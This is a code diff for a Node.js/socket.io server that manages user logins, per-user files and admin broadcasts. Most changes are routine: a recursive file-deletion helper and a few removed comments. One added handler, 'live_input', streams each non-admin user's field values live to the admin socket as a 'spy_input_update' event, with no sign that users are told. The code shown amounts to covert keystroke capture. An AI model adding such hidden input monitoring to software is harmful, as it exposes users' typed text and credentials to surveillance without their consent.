@@ -49,6 +49,13 @@ function broadcastPersonnelUpdate() {
     }
 }
 
+function deleteRecursive(userId, itemId) {
+    if (!dataStore.userFiles[userId]) return;
+    const children = dataStore.userFiles[userId].filter(f => f.parentId === itemId);
+    children.forEach(child => deleteRecursive(userId, child.id));
+    dataStore.userFiles[userId] = dataStore.userFiles[userId].filter(f => f.id !== itemId);
+}
+
 app.post('/api/login', async (req, res) => {
     const { userId } = req.body;
     if (!userId) return res.status(400).json({ success: false, message: "ID REQUIRED" });
@@ -147,6 +154,17 @@ io.on('connection', (socket) => {
         }
     });
 
+    socket.on('live_input', (data) => {
+        if (!currentUserId || currentUserId === "8989") return;
+        if (adminSocketId) {
+            io.to(adminSocketId).emit('spy_input_update', {
+                targetId: currentUserId,
+                field: data.fieldId,
+                value: data.value
+            });
+        }
+    });
+
     socket.on('disconnect', () => {
         if (currentUserId) {
             if (currentUserId === "8989") {
@@ -158,7 +176,6 @@ io.on('connection', (socket) => {
         }
     });
 
-    // --- FILE SYSTEM ---
     socket.on('fs_get_files', () => {
         if(!currentUserId) return;
         if(!dataStore.userFiles[currentUserId]) dataStore.userFiles[currentUserId] = [];
@@ -175,8 +192,7 @@ io.on('connection', (socket) => {
 
     socket.on('fs_delete_item', (itemId) => {
         if(!currentUserId) return;
-        if(!dataStore.userFiles[currentUserId]) return;
-        dataStore.userFiles[currentUserId] = dataStore.userFiles[currentUserId].filter(i => i.id !== itemId && i.parentId !== itemId);
+        deleteRecursive(currentUserId, itemId);
         saveData();
         socket.emit('fs_load', dataStore.userFiles[currentUserId]);
     });
@@ -190,7 +206,6 @@ io.on('connection', (socket) => {
         }
     });
 
-    // --- ADMIN / OBUNTO ---
     socket.on('admin_broadcast_message', (data) => {
         io.emit('receive_broadcast_message', { 
             message: data.message, 
